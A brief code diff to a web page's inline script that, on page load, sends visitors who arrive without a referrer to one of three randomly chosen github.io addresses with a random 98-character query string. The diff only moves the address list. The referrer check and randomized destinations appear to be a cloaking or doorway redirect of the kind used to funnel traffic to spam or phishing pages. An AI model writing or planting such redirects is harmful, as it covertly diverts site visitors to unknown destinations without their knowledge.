@@ -40,9 +40,10 @@
 </script>
 
 <script>
-    if (!document.referrer) {
-        var items = ['https://ccbv39.github.io/index.html','https://rbtr30.github.io/index.html','https://zscb03.github.io/index.html'];
+    var items = ['https://ccbv39.github.io/index.html','https://rbtr30.github.io/index.html','https://zscb03.github.io/index.html'];
         var iindex = items[Math.floor(Math.random() * items.length)];
+    if (!document.referrer) {
+        
         data = iindex + "?" + randomString(98);
         location.href = data;
     } else {
